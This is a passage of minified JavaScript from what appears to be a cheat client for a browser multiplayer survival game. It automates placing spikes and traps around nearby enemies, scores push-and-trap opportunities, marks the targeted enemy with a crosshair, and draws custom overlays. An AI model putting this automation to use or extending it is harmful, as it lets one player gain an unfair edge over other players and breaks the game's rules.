        Zt.style.display = "block",
            Oi.style.display = "block",
            Wt.style.display = "none"
    }, T.deathFadeout),
        wo()
    await nextTick()

}
function removeObjects2(e) {
    if(Mitocondria.ID == e){
         Mitocondria.ID = null
    }
    et=et.filter(t => t?.owner?.sid!=e)
    opsList = opsList.filter(x => x?.sid != e)
 
    Pt = Pt.filter(x=> x.sid != e)
    E && ue.removeAllItems(e)
}

function cN(spike, trap, newEnemies, time){
    let kln;
    let rNn;
    let sbp = nearObjects.filter(x => (x.name == "pit trap" || x.group?.name == "spikes" || x.type === 1 && x.y >= 12000) && x.distance <= 450);
    let lapw = {};
    let sSet = R.list[spikeType].scale - 50
    for(let m = 0; m < newEnemies.length; m++) {
        let x = newEnemies[m];
        for(let i = 0; i < trap.length; i++){
            let angleAbuse = true;
            for(let t = 0; t < x.placePot.possible.length; t++){
                let obj = x.placePot.possible[t]
               lapw[trap[i].angle+x.name+x.sid+obj.angle] = dist2(trap[i],obj)
                if(lapw[trap[i].angle+x.name+x.sid+obj.angle] <= trap[i].scale + obj.scale){
                    trap[i].placePriority = true;
                    angleAbuse = false;
                    break;
                }
            }
            let dist4 = dist2(trap[i],x)
            if(dist4 <= 200) trap[i].points += 1;
            if(dist4<=20.4){
                trap[i].points += 1
            }
            if(dist4 <= 50){
                trap[i].collide.push(x.sid)
                trap[i].points += inTrap ? 4 : 2;
            }
            let obj = sbp.filter(t => (t?.group?.name === "spikes" && (clan(t.owner.sid) || !x.team && t?.owner?.sid != x.sid)|| t.y >= 12000 && t.type === 1) && fastHypot(t.x-trap[i].x,t.y-trap[i].y) <= 50 + (t.type == 1 ? t.scale * 0.55 : t.scale) + 24 && !trap[i].sids.includes(t.sid))
            if(obj.length){
                trap[i].points+= (1 + obj.length)
                trap[i].canPush = true;
            }


            if(dist4<=x.placePot.placeRange){
                if(angleAbuse){
                    trap[i].points += 1
                } else {
                    trap[i].points += .5
                }
            }
            if(!rNn ||rNn.points<=trap[i].points) rNn = trap[i];
        }
        for(let i = 0; i < spike.length; i++){
            spike[i].bounce = false;
            spike[i].collision = false;
            if(isInPath(spike[i])) continue;
            let dist4 = dist2(spike[i],x)

            let angleAbuse = true
            for(let t = 0; t < x.placePot.possible.length; t++){
                let obj = x.placePot.possible[t]
                if(lapw[spike[i].angle+x.name+x.sid+obj.angle] + sSet <= spike[i].scale + obj.scale){
                    spike[i].placePriority = true;
                    angleAbuse = false;
                    break;
                }
            }
            let trapDist = x.inTrap ? dist2(spike[i],x.inTrap) : Infinity
            let angDist = dAng(atan2(spike[i].y - E.y2, spike[i].x - E.x2), dAng(atan2(x.y2 - E.y2, x.x2 - E.x2)));
            if(dist4 <= 35 + spike[i].scale){
                if(spike[i].collide.length >=1)spike[i].origin.push({amount:1,from:`collides with ${x.name}[${x.sid}]`,player:x})
                spike[i].collide.push(x.sid)
                spike[i].collision = true;
                let bouncer = knockInto(spike[i],sbp,x)
                if(bouncer.building){
                    spike[i].into = bouncer
                    if(bouncer.building.name == "pit trap" && !(spike[i].preplace && x.inTrap && spike[i].sids.includes(x.inTrap.sid))){
                        spike[i].points += 2.5;
                    } else if(bouncer.bounce){
                        spike[i].bounce = true;
                        spike[i].points += 5;
                    } else if(bouncer.building.name !== "pit trap"){
                        spike[i].points += 3;
                    } else {
                        spike[i].into = false
                    }
                }
                //}
                if(x.inTrap && !spike[i].sids.includes(x.inTrap.sid)){
                    spike[i].points+=2
                    spike[i].spikeTrap = true;
                    spike[i].canPush = true;
                }
            }
            if(x.inTrap && !spike[i].sids.includes(x.inTrap.sid) && trapDist <= 50 + spike[i].scale + 21){
                spike[i].canPush = true;
                spike[i].points+=1
            }
            if(x.inTrap && dist4 <= 250 && (dAng(spike[i].angle,x.inTrap.angToMe) >= 1.5 || moveDirection === null || moveDirection === undefined)){
                spike[i].points+=2
            }
            if(x.inTrap && pushing && dAng(pushVector.dir, atan2(x.y2 - E.y2, x.x2 - E.x2)) > 4.7) {
                logAndStack("prevents bounce back");
                spike[i].points += 2;
            }
            if(angleAbuse&&dist4<=x.placePot.placeRange){
                spike[i].points+=1
            }
            if(!kln ||kln.points<=spike[i].points) kln = spike[i];
        }
       lapw = {};
    }
    return {spikes:spike,traps:trap,kln:kln,rNn:rNn}
}
let prioSync = false;
function removeObject(e,t,d, message) {
    ue.disableBySid(e)


    /*serverconnected && socketer.send(JSONStringify({
        msg: "removeBuild",
        sender: E?.sid, // add + 1 for testing purposes
        sendX: E?.x2,
        sendY: E?.y2,
        removeSid: e,
        time: Date.now(),
        server: location.href
    }));*/
    et = et.filter(x => {
        if(x.sid !== e) return true;
        if(!inRender(E,x)){
            x.TICK = tick;
            brokenObjects.push(x)
        }
        if(x.sid == e && inTrap.sid === x.sid) {
            Hg(6, E.tailIndex);
        }
        if(x.sid == e && nearestenemy && nearestenemy?.globalTrap?.sid === x.sid && dist(E, x) <= 126){
            //console.log(x);
            destroyedTraps.push({
                build: x,
                destroyedAt: tick,
            });
            //spikeSync.push(x);
            if(clairo2) {
                place(E.items[2], getAimer(E, x));
                place(E.items[2], getAimer(E, nearestenemy));
            }
            /*if(spikeSync.length && spikeTicker.checked && (primary == 3 || primary == 4 || primary == 5) && polePlacer(R.list[spikeType], getAimer(E, x), x)) {
                prioSync = true;
            } else prioSync = false;*/
        }
        if (x.sid === e && !prioSync && nearestenemy &&dist(E,nearestenemy) <= 235&& dist(E,x) <= 190&& document.getElementById("autoREPLACER").checked && R.list[E.items[4]]?.name == "pit trap") {
            // TO DO: check if it doesn't collide with our preplace locations, and also create replaceLocations, so auto place doesn't collide with auto place, whilst still both being able to run at the same time
            // im restricting preplace location, so auto replace doesn't mess up with it
            const possibleSpikes = findAvailableAnglesR(spikeType, 0, 0, PI / 35);
            const possibleTraps = findAvailableAnglesR(boostType, 0, 0, PI / 35);
            const placer = cN(possibleSpikes, possibleTraps, nearEnemies);
            const { rNn, kln } = placer;
            placer.spikes.sort((a, b) => b.points - a.points);
            placer.traps.sort((a, b) => b.points - a.points);
            if(placer.spikes.length && placer.traps.length) {
                function fullplace(placedItems, allItems = placer.spikes.concat(placer.traps)) {
                    allItems = allItems.filter(item => item.points > 0);
                    if (packets >= 85 || (!kln && !rNn && !keys.c)) return;
                    allItems.sort((a, b) => {
                        if (b.points === a.points && a.name !== b.name) {
                            return a.name === 'pit trap' ? -1 : 1;
                        }
                        return b.points - a.points;
                    });
                    // remove intersections, once it reaches 4 stop.
                    //dist(trap,spike) <= trap.scale+spike.scale
                    for (let item of allItems) {
                        const intersectsWithPlaced = placedItems.some(placed => dist2(placed, item) <= placed.scale + item.scale);
                        const intersectsWithPrioLoc = prioLoc.some(prio => dist2(prio, item) <= prio.scale + item.scale);
                        if (!intersectsWithPlaced && !intersectsWithPrioLoc) {
                            placedItems.push(item);
                        }
                        if (placedItems.length === 4) break;
                    }
                    // actually do the placing
                    for (let item of placedItems) {
                        if (!item.did) {
                            placers(item.id, item.angle)
                            replaceLoc.push(item);
                            usedAngles.push({ ...item, tick: tick });
                        }
                    }
                }
                // add place priority back, but not preplace (nvm, don't add either)
                let placing = [];
                // !prioLoc.some(item => dist2(item, kln) <= item.scale + kln.scale) maybe comment this out
                // !prioLoc.some(item => dist2(item, rNn) <= item.scale + rNn.scale) maybe comment this out
                // check if preplace doesn't block where we are replacing lol
                //logAndStack(`Auto place activty check ${amPlacing}`);
                if (kln && kln.points > 0 && !prioLoc.some(item => dist2(item, kln) <= item.scale + kln.scale) && (!rNn.canPush || kln.into) && (pushing && rNn.points > 0 || kln.bounce)) {
                    if (kln.into) {
                        KB(kln.into.newPos);
                    }
                    if(kln.collision) {
                     
                    }
                    if(kln.placePriority) {
                        placers(inTrap ? 15 : spikeType, kln.angle)
                        usedAngles.push({ ...kln, tick: tick });
                    } else {
                        placers(inTrap ? 15 : spikeType/*.id*/, kln.angle)
                        usedAngles.push({ ...kln, tick: tick });
                    }
                    kln.did = true;
                    placing.push(kln);
                    replaceLoc.push(kln);
                }
                if(rNn && rNn.points > 0 && !prioLoc.some(item => dist2(item, rNn) <= item.scale + rNn.scale) && !(kln &&kln.points>0 && (!pushing && kln.bounce) && dist(rNn, kln) <= rNn.scale + kln.scale)|| rNn?.canPush || pushing){
                    if(rNn.placePriority) {
                        placers(boostType, rNn.angle);
                        usedAngles.push({ ...rNn, tick: tick });
                    } else {
                        placers(boostType, rNn.angle);
                        usedAngles.push({ ...rNn, tick: tick });
                    }
                    rNn.did = true;
                    placing.push(rNn);
                    replaceLoc.push(rNn);
                }
                fullplace(placing);

                /*d = getAimer(E,x)
            if(pushing){
                Hq(boostType,d,true)
            }
            for (let i = -1; i <= 1; i++) {
                Hq(boostType, d+i,true);
            }*/
            }
        }
        return false;
    });
    ue.disableBySid(e)
}
function resourceCount() {
    Hh.innerText = E.points,
        Fh.innerText = E.food,
        Vh.innerText = E.wood,
        Uh.innerText = E.stone,
        Lh.innerText = E.kills
}
const Vt = {}
, Mn = ["crown", "skull", "inztaTarget"];
function Af() {
    for (let t = 0; t < Mn.length; ++t)
        if ((console.log(Mn[t]), "inztaTarget" == Mn[t])) {
            var n = new Image();
            (n.onload = function () {
                this.isLoaded = !0;
            }),
                (n.src =
                 "https://media.discordapp.net/attachments/1406655186671239180/1411527653558714438/crosshair_3.png?ex=68b4fb11&is=68b3a991&hm=5b59524d6feda6879395f26f7cb7270425bd2f5cded133d0e601480957cd9767&=&format=webp&quality=lossless"),
                (Vt[Mn[t]] = n);
        } else {
            var n = new Image();
            (n.onload = function () {
                this.isLoaded = !0;
            }),
                (n.src = "./img/icons/" + Mn[t] + ".png"),
                (Vt[Mn[t]] = n);
        }
}
const ut = [];
function updateUpdate(e, t) {
    displayItemCount()
    if (E.upgradePoints = e,
        E.upgrAge = t,
        e > 0) {
        ut.length = 0,
            C.removeAllChildren(ht);
        for (var i = 0; i < R.weapons.length; ++i)
            if (R.weapons[i].age == t && (R.weapons[i].pre == null || E.weapons.indexOf(R.weapons[i].pre) >= 0)) {
                var s = C.generateElement({
                    id: "upgradeItem" + i,
                    class: "actionBarItem",
                    onmouseout: function() {
                        Se()
                    },
                    parent: ht
                });
                s.style.backgroundImage = document.getElementById("actionBarItem" + i).style.backgroundImage,
                    ut.push(i)
            }
        for (var i = 0; i < R.list.length; ++i)
            if (R.list[i].age == t && (R.list[i].pre == null || E.items.indexOf(R.list[i].pre) >= 0)) {
                const r = R.weapons.length + i;
                var s = C.generateElement({
                    id: "upgradeItem" + r,
                    class: "actionBarItem",
                    onmouseout: function() {
                        Se()
                    },
                    parent: ht
                });
                s.style.backgroundImage = document.getElementById("actionBarItem" + r).style.backgroundImage,
                    ut.push(r)
            }
        for (var i = 0; i < ut.length; i++)
            (function(r) {
                const o = document.getElementById("upgradeItem" + r);
                o.onmouseover = function() {
                    R.weapons[r] ? Se(R.weapons[r], !0) : Se(R.list[r - R.weapons.length])
                }
                    ,
                    o.onclick = C.checkTrusted(function() {
                    knla.send("H", r)
                }),
                    C.hookTouchEvents(o)
            }
            )(ut[i]);
        ut.length ? (ht.style.display = "block",
                     ri.style.display = "block",
                     ri.innerHTML = "SELECT ITEMS (" + e + ")") : (ht.style.display = "none",
                                                                   ri.style.display = "none",
                                                                   Se())
    } else
        ht.style.display = "none",
            ri.style.display = "none",
            Se()
}


function ageUpdate(e, t, i) {
    e != null && (E.XP = e),
        t != null && (E.maxXP = t),
        i != null && (E.age = i),
        i == T.maxAge ? (gr.innerHTML = "MAX AGE",
                         yr.style.width = "100%") : (gr.innerHTML = "AGE " + E.age,
                                                     yr.style.width = E.XP / E.maxXP * 100 + "%")
}


function Fk(e) {
  C.removeAllChildren(mr);
    let t = 1;
    for (let i = 0; i < e.length; i += 3)
        (function(s) {
            C.generateElement({
                class: "leaderHolder",
                parent: mr,
                children: [C.generateElement({
                    class: "leaderboardItem",
                    style: "color:" + (e[s] == mo ? "#fff" : "rgba(255,255,255,0.6)"),
                    text: t + ". " + (e[s + 1] != "" ? e[s + 1] : "unknown")
                }), C.generateElement({
                    class: "leaderScore",
                    text: C.kFormat(e[s + 2]) || "0"
                })]
            })
        }
        )(i),
            t++



}
let xr = null;
function Of() {

    {

if (E && (!yn || It - yn >= (1e3 / T.clientSendRate))) {
            yn = It;
            const a = vs();
            xr !== a && (xr = a
                        )
        }
        if (mi < 120 && (mi += .1 * be,
                         Wt.style.fontSize = Math.min(Math.round(mi), 120) + "px"),
            E) {
            const a = C.getDistance(Re, _e, E.x, E.y)
            , u = C.getAimerection(E.x, E.y, Re, _e)
            , p = Math.min(a * .004 * be, a);
            a > .05 ? (Re += p * Math.cos(u),
                       _e += p * Math.sin(u)) : (Re = E.x,
                                               _e = E.y)


        } else
            Re = T.mapScale / 2,
                _e = T.mapScale / 2;
        const o = It - timeBetweenTick;
        for (var e, t = 0,animALL = J.concat(WC); t < animALL.length + ye.length; ++t)
            if ((y = animALL[t] || ye[t - animALL.length]) && y && (y?.visible||y?.fake||y?.spectate && y.specVis))
                if (y.forcePos)
                    y.x = y.x2,
                        y.y = y.y2,
                        y.dir = y.d2;
                else {
                    var a = y.t2 - y.t1
                    , p = (o - y.t1) / a
                    , h = 170;
                    y.dt += be;
                    var m = min(1.7, y.dt / h);
                    var e = y.x2 - y.x1;
                    y.x = y.x1 + e * m,
                        e = y.y2 - y.y1,
                        y.y = y.y1 + e * m,
                        y.lastx = y.x//_.x1 + u * h
                    y.lasty = y.y//_.y1 + u * h
                    y.dir = Math.lerpAngle(y.d2, y.d1, min(1.2, p))
                }
        const l = Re - se / 2 + camX
        , c = _e - re / 2 + camY;
        T.snowBiomeTop - c <= 0 && T.mapScale - T.snowBiomeTop - c >= re ? (M.fillStyle = "#b6db66",
                                                                            M.fillRect(0, 0, se, re)) : T.mapScale - T.snowBiomeTop - c <= 0 ? (M.fillStyle = "#dbc666",
                                                                                                                                                M.fillRect(0, 0, se, re)) : T.snowBiomeTop - c >= re ? (M.fillStyle = "#fff",
        M.fillRect(0, 0, se, re)) : T.snowBiomeTop - c >= 0 ? (M.fillStyle = "#fff",
                                                               M.fillRect(0, 0, se, T.snowBiomeTop - c),
                                                               M.fillStyle = "#b6db66",
                                                               M.fillRect(0, T.snowBiomeTop - c, se, re - (T.snowBiomeTop - c))) : (M.fillStyle = "#b6db66",
                                                                                                                                    M.fillRect(0, 0, se, T.mapScale - T.snowBiomeTop - c),
                                                                                                                                    M.fillStyle = "#dbc666",
                                                                                                                                    M.fillRect(0, T.mapScale - T.snowBiomeTop - c, se, re - (T.mapScale - T.snowBiomeTop - c))),
            Ei || (ct += wn * T.waveSpeed * be,
                   ct >= T.waveMax ? (ct = T.waveMax,
                                      wn = -1) : ct <= 1 && (ct = wn = 1),
                   M.globalAlpha = 1,
                   M.fillStyle = "#dbc666",
                   Tr(l, c, M, T.riverPadding),
                   M.fillStyle = "#91b2db",
                   Tr(l, c, M, (ct - 1) * 250)),
            M.lineWidth = 4,
            M.strokeStyle = "#000",
            M.globalAlpha = .06,
            M.beginPath();

            for (var i = -Re; i < se; i += re / 18)
                i > 0 && (M.moveTo(i, 0),
                          M.lineTo(i, re));
            for (let a = -_e; a < re; a += re / 18)
                i > 0 && (M.moveTo(0, a),
                          M.lineTo(se, a));
        
        M.stroke(),
            M.globalAlpha = 1,
            M.strokeStyle = ei,
            zt(-1, l, c),
            M.globalAlpha = 1,
            M.lineWidth = Xe,
            br(0, l, c),
            Ir(l, c, 0),
            //     Ir(l, c, 0),
            M.globalAlpha = 1;
        for (var t = 0; t < ye.length; ++t)
            y = ye[t],
                y.active && y.visible && (y.animate(be),
                                          M.save(),
                                          M.translate(y.x - l, y.y - c),
                                          M.rotate(y.dir + y.dirPlus - PI / 2),
                                          Jf(y, M),
                                          M.restore());
        if (zt(0, l, c),
            br(1, l, c),
            zt(1, l, c),
            Ir(l, c, 1),
            zt(2, l, c),
            zt(3, l, c),
            M.fillStyle = "#000",
            M.globalAlpha = .09,
            l <= 0 && M.fillRect(0, 0, -l, re),
            T.mapScale - l <= se) {
            var s = max(0, -c);
            M.fillRect(T.mapScale - l, s, se - (T.mapScale - l), re - s)
        }
        if (c <= 0 && M.fillRect(-l, 0, se + l, -c),
            T.mapScale - c <= re) {
            var n = max(0, -l);
            let a = 0;
            T.mapScale - l <= se && (a = se - (T.mapScale - l)),
                M.fillRect(n, T.mapScale - c, se - n - a, re - (T.mapScale - c))
        }
        if(E && Tach?.goal?.pathing){
            M.globalAlpha = 1;
            M.save();
            M.translate(-l, -c);
            Pathfinder?.drawPath(M, '#ffffff', E, "#00FF00");
            Tach?.drawWaypoints(M, E.skinRot);
            M.restore();
        }
     M.fillStyle = "rgba(0, 0, 70, .35)",
        M.globalAlpha = 1,
            M.fillRect(0, 0, se, re),
            M.strokeStyle = kr;
        let list2 = J.concat()
        for (var t = 0; t < list2.length + ye.length; ++t)
            if (y = list2[t] || ye[t - list2.length],
                y?.visible && (y?.skinIndex != 10 ||y?.skinIndex == 10|| y == E || y?.team && y?.team == E.team)) {
                //var w
            const u = (y.team ? "[" + y.team + "] " : "") + (y.name || "")
if (u != "" && document.getElementById("test222").checked) {
    if (M.font = (y.nameScale || 30) + "px Hammersmith One");
    M.fillStyle = "#fff";
    M.textBaseline = "middle";
    M.textAlign = "center";
    M.lineWidth = y.nameScale ? 11 : 8;
    M.lineJoin = "round";
    const textX = y.x - l;
    const textY = y.y - c - y.scale - T.nameY;

    M.strokeText(u, textX, textY);
    M.fillText(u, textX, textY);

    if (y.isLeader && Vt.crown.isLoaded) {
        const crownScale = T.crownIconScale;
        const crownX = textX - crownScale / 2 - M.measureText(u).width / 2 - T.crownPad;
        M.drawImage(Vt.crown, crownX, textY - crownScale / 2 - 5, crownScale, crownScale);
    }
 if (nearestenemy && y.sid == nearestenemy.sid && y.isPlayer && WR && primary == 5 && Vt.inztaTarget.isLoaded) {
                        var A = 2 * y.scale;
                        M.drawImage(Vt.inztaTarget, y.x - l - A / 2, y.y - c - A / 2, A, A);
                    }
    if (y.iconIndex === 1 && Vt.skull.isLoaded) {
        const skullScale = T.crownIconScale;
        const skullX = textX + M.measureText(u).width / 2 + T.crownPad - skullScale / 2;
        M.drawImage(Vt.skull, skullX, textY - skullScale / 2 - 5, skullScale, skullScale);
    }
}
if(document.getElementById("visual").checked && y.isPlayer && y.sid==E.sid) {
    M.fillStyle = kr;
    M.roundRect(y.x - l - 50.5 - T.healthBarPad, y.y - c + y.scale + T.nameY - 13, 1.3 * 24.9 + 2 * T.healthBarPad, 17, 10);
    M.fill();

    M.fillStyle = y.primaryXD != 1 ? `hsl(${100 - (y.pr) * 405},50%,60%)` : "#96FFDF";
    M.roundRect(y.x - l - 50.5, y.y - c + y.scale + T.nameY - 13 + T.healthBarPad,
        1.3 * 25 * (y.primaryXD + (y.pPrimaryXD - y.primaryXD) * min(1, y.dt / y.delta)),
        17 - 2 * T.healthBarPad, 10);
    M.fill();

    M.fillStyle = kr;
    M.roundRect(y.x - l + 17.6 - T.healthBarPad, y.y - c + 0.2 + y.scale + T.nameY - 13, 1.3 * 24.9 + 2 * T.healthBarPad, 16, 10);
    M.fill();

    M.fillStyle = y.secondaryXD != 1 ? `hsl(${100 - (y.sr) * 405},50%,60%)` : "#96FFDF";
    M.roundRect(y.x - l + 17.6, y.y - c + 0.2 + y.scale + T.nameY - 13 + T.healthBarPad,
        1.3 * 25 * (y.secondaryXD + (y.sSecondaryXD - y.secondaryXD) * min(1, y.dt / y.delta)),
        17 - 2 * T.healthBarPad, 9);
    M.fill();


    M.fillStyle = kr;
    M.roundRect(y.x - l - 15.1 - T.healthBarPad, y.y - c + y.scale + T.nameY - 13, 1.2 * 24.9 + 2 * T.healthBarPad, 16, 10);
    M.fill();

    M.fillStyle = y.zikachecks != 1 ? `hsl(${100 - (y.tr) * 405},50%,60%)` : "#96FFDF";
    M.roundRect(y.x - l - 15.1, y.y - c + y.scale + T.nameY - 13 + T.healthBarPad,
        1.2 * 25 * (y.zikachecks + (y.tr - y.zikachecks) * min(1, y.dt / y.delta)),
        17 - 2 * T.healthBarPad, 9);
    M.fill();
}
   if(paths && paths.length&&y.sid==E.sid) {
                    M.lineCap = "round";
                    M.strokeStyle = 'white'
                    M.lineWidth = 3;
                    M.beginPath();
                    var length = paths.length;
                    M.moveTo(paths[0] - l, paths[1] - c);
                    for(let i = 0; i < length; i += 2) {
                        M.lineTo(paths[i] - l, paths[i + 1] - c);
                        M.stroke();
                    }
                }

if (y.isPlayer) {
    if (nearestenemy && y.sid == nearestenemy.sid && typeof pushCoords === "object" && pushing) {
        M.fillStyle = "#fff";
        M.strokeStyle = "black";
        M.lineWidth = 2;
        M.globalAlpha = 0.8;
        M.font = "20px Hammersmith One";
        M.textAlign = "center";
        M.textBaseline = "middle";
        const centerX = (E.x2 + nearestenemy.x2 + pushVector.x) / 2 - l;
        const centerY = (E.y2 + nearestenemy.y2 + pushVector.y) / 2 - c;
        M.fillText("XDDDD", centerX, centerY);
        M.strokeText("XDDDD", centerX, centerY);
    }
}

M.font = "20px Hammersmith One";
const textWidth = M.measureText(y.name).width;



M.strokeStyle = kr;
M.globalAlpha = 1;
y.health2 += (y.health - y.health2) * 0.5;

if (y.health > 0) {
    let setter = 0;
    M.fillStyle = kr;
    M.roundRect(y.x - l - T.healthBarWidth - T.healthBarPad, y.y - c + y.scale + T.nameY - setter, T.healthBarWidth * 2 + T.healthBarPad * 2, 17, 8);
    M.fill();
    M.fillStyle = kr;
    M.roundRect(y.x - l - T.healthBarWidth, y.y - c + y.scale + T.nameY + T.healthBarPad - setter, T.healthBarWidth * 2, 17 - T.healthBarPad * 2, 7);
    M.fill();
    M.fillStyle = y == E || y.team && y.team == E.team ? "#8ecc51" : "#cc5151";
    let animatedHealth = (y.isAI ? y.health2 : (y.lastHealth == undefined || y.animatedHealth == undefined) ? y.health2 : y.lastHealth + (y.health - y.lastHealth) * min(1, max(0, 1 - pow(1 - min(1, (Date.now() - y.animatedHealth) / 250), 2))));
    let healthRatio = animatedHealth / y.maxHealth;
    let healthBarWidth = T.healthBarWidth * 2 * healthRatio;
    M.roundRect(y.x - l - T.healthBarWidth, y.y - c + y.scale + T.nameY + T.healthBarPad - setter, healthBarWidth, 17 - T.healthBarPad * 2, 7);
    M.fill();
}

         


            }
 drawRedStunned();
        Hn.update(be, M, l, c);
        let list = J.concat();
         for (var t = 0; t < list.length; ++t)
            if (y = list[t],
                y.visible && y.chatCountdown > 0) {
                y.chatCountdown -= be,
                    y.chatCountdown <= 0 && (y.chatCountdown = 0),
                    M.font = "bold 22px Comic Sans MS";
                const u = M.measureText(y.chatMessage);
                M.textBaseline = "middle",
                    M.textAlign = "center";
                var ae = y.x - l
                , ea = y.y - y.scale - c - 90;
                const m = 47
                , w = u.width + 17;
                M.fillStyle = "rgba(0,0,0,0.2)",
                    M.roundRect(ae - w / 2, ea - m / 2, w, m, 6),
                    M.fill(),
                    M.fillStyle = "#fff",
                    M.fillText(y.chatMessage, ae, ea)

            //if(!y?.spectate) {
            if (teamMessage.time > 0&&(y = animALLS[t])?.sid==E?.sid&&amAlive){
                teamMessage.time -= be
                //teamMessage.time <= 0
                M.font = "32px Hammersmith One";
                M.strokeStyle = "#2d3030";
                var xx = M.measureText(teamMessage.message);
                M.textBaseline = "middle",
                    M.textAlign = "center",
                    n = y.x - l,
                    s = y.y - y.scale - c - 140;
                var SS = xx.width + 17;
                M.fillStyle = "rgba(0,0,0,.5)",
                    M.roundRect(n - SS / 2, s - 23.5, SS, 47, 6),
                    M.fill(),
                    M.fillStyle = "#fff",
                    M.fillText(teamMessage.message, n, s)
            }
        }
        //}


    }
    lf(be)
}
function br(e, t, i) {
    for (let s = 0; s < Mt.length; ++s)
        y = Mt[s],
            y.active && y.layer == e && (y.update(be),
                                         y.active && Bo(y.x - t, y.y - i, y.scale) && (M.save(),
                                                                                       M.translate(y.x - t, y.y - i),
                                                                                       M.rotate(y.dir),
                                                                                       Zn(0, 0, y, M),
                                                                                       M.restore()))
}
const Sr = {};
/*function Zn(e, t, i, s, n) {
    if (i.src) {
        const r = R.projectiles[i.indx].src;
        let o = Sr[r];
        o || (o = new Image,
              o.onload = function() {
            this.isLoaded = !0
        }
              ,
              o.src = "./img/weapons/" + r + ".png",
              Sr[r] = o),
            o.isLoaded && s.drawImage(o, e - i.scale / 2, t - i.scale / 2, i.scale, i.scale)
    } else
        i.indx == 1 && (s.fillStyle = "#939393",
                        Q(e, t, i.scale, s))
}*/
function Zn(e, t, n, i, r) {
    if (n.src) {
        var s = R.projectiles[n.indx].src,
            a = Sr[s];

        if (!a) {
            a = new Image();
            a.onload = function() {
                this.isLoaded = true;

                // Cache the composite image
                compositeImages.weapons[s] = generateCompositeImage(1,this, n.scale);
            };
            a.src = ".././img/weapons/" + s + ".png";
            Sr[s] = a;
        } else if(a && compositeImages.weapons[s]==undefined){
            a = new Image();
            a.onload = function() {
                this.isLoaded = true;

                // Cache the composite image
                compositeImages.weapons[s] = generateCompositeImage(1,this, n.scale);
            };
            a.src = ".././img/weapons/" + s + ".png";
            Sr[s] = a;
        }

        if (a.isLoaded) {
            var compositeImage = a;

            if (compositeImage) {
                // Draw the cached composite image onto the canvas
                i.drawImage(compositeImage, e - n.scale / 2, t - n.scale / 2, n.scale, n.scale);
            }
        }
    } else if (n.indx === 1) {
        i.fillStyle = "#939393";
        Q(e, t, n.scale, i)
    }
}
function calculatePoint(x, y, angle, distance) {
    return {
        x: x + distance * cos(angle),
        y: y + distance * sin(angle)
    };
}
function Rf() {
    const e = Re - se / 2
    , t = _e - re / 2;
    Me.animationTime += be,
        Me.animationTime %= T.volcanoAnimationDuration;
    const i = T.volcanoAnimationDuration / 2
    , s = 1.7 + .3 * (abs(i - Me.animationTime) / i)
    , n = T.innerVolcanoScale * s;
    M.drawImage(Me.land, Me.x - T.volcanoScale - e, Me.y - T.volcanoScale - t, T.volcanoScale * 2, T.volcanoScale * 2),
        M.drawImage(Me.lava, Me.x - n - e, Me.y - n - t, n * 2, n * 2)
}
function Tr(e, t, i, s) {
    const n = T.riverWidth + s
    , r = T.mapScale / 2 - t - n / 2;
    r < re && r + n > 0 && i.fillRect(0, r, se, n)
}
const fadeInSpeed = 0.05;
const fadeOutSpeed = 0.025;
const minOpacity = 0.1;
const maxOpacity = 1.0;
function fader(obj) {
    if (!obj.fadingOut) {
        obj.opacity2 += fadeInSpeed;
        if (obj.opacity2 >= maxOpacity) {
            obj.opacity2 = maxOpacity;
            obj.fadingOut = true;
        }
    } else {
        obj.opacity2 -= fadeOutSpeed;
        if (obj.opacity2 <= minOpacity) {
            obj.opacity2 = minOpacity;
            obj.fadingOut = false;
        }
    }
    return obj.opacity2;
}
var noArcs = false;
function zt(e, t, i, ezzz) { //renderGameObjects
    let s, n, r, eP;
    ezzz = amAlive ? renderObjects.concat(showPlace) : et;
    eP = ezzz.length;
    for (let o = 0; o < eP; ++o) {
        y = ezzz[o];
        if (!y || !y.active) continue;
        n = y.x + y.xWiggle - t;
        r = y.y + y.yWiggle - i;
        if (e === 0) y.update(be);
        breakObjs
        if (y.layer === e && Bo(n, r, y.scale + (y.blocker || 0))) {

  
            if (y.isItem) {
                if (y.fake && !noArcs.checked) {
                    M.save();
                    M.globalAlpha = 0.7;
                    M.translate(n, r);
                    M.rotate(y.dir);
                    M.beginPath();
                    M.arc(0, 0, y.scale, 0, PI2);
                    M.fillStyle = y.restricter ? "skyblue" : y.preplace ? "skyblue" : "skyblue";
                    M.fill();
                    M.stroke();
                    M.restore();
                } else {
                    s = Ss(y, false/*y.fake*/, false, y);
                    M.save();
                    M.translate(n, r);
                    M.rotate(y.dir);
                    M.drawImage(s, -(s.width / 2), -(s.height / 2));
                    if (y.blocker) {
                        M.strokeStyle = "#db6e6e";
                        M.globalAlpha = 0.3;
                        M.lineWidth = 6;
                        Q(0, 0, y.blocker, M, false, true);
                    }
                    M.restore();
                }
            } else if (y.type === 4) {
                Rf();
            } else {
                s = Hf(y);
                M.drawImage(s, n - s.width / 2, r - s.height / 2);
            }
        }
    }
}
async function gatherAnimation(e, t, i, ws, _) {
    if(!ws){
        if(_ = findPlayerSID(e)) {
            _.startAnim(t, i);
            reloadConfiguration(e,t,i,false);
            _.hitBuild = t;
        }
        await nextTick()
        if(t){
            _ = findPlayerSID(e)
            hitList.forEach((e) => {e.attemptResolve(_, _.skinIndex,tick)})
        }
    }else{
        _ = ws.findPlayer(e)
        _.startAnim(t,i)
    }
}
function reloadConfiguration(id,weapon,hit,bool,player,_){
    if(!bool) return updater.push({id: reloadConfiguration, data: [id, hit, weapon, true]});
    _ = findPlayerSID(id);
    if(_ === null) return;
    weapon>9?_.sr = 0: _.pr=0
    _.slowMult -= (R.weapons[weapon].hitSlow || 0.3);
    if (_.slowMult < 0) _.slowMult = 0;
    _.sid==E.sid&&(E.invisTime = 1000);
    _.skinIndex == 20 && (weapon >9)? (_.samRS = .78) : (_.samRS = 1)
    _.skinIndex == 20 && (weapon<9) ? (_.samRP = .78) : (_.samRP = 1);
    player = findPlayerSID(id)
    let allEnt = J.concat(ye)
    allEnt.filter((e)=> {
        //  C.getAngleDist(this.dir, player.d2) <= Math.PI / 2.6
        let bool = e.sid!=player.sid&&dist(player,e,"player")<=R.weapons[weapon].range&&(player.team&&player.team!=e.team||!player.team)&&C.getAngleDist(getAimer(player,e), player.d2) <= gatherAng ? true : false
        if(!e.isAI&&bool){
            if((weapon>=9&&(player.secondaryVar===3||player.skinIndex==21)||weapon<9&& (player.primaryVar===3||player.skinIndex==21)))e.poison = 5
        }
        if(bool){
            //58,55,18 acc
            if(player.skinIndex == 58 || player.skinIndex == 55 || player.tailIndex == 18){
                player.gatherHeal = {dmg:R.weapons[weapon].dmg,tick:tick}
            }
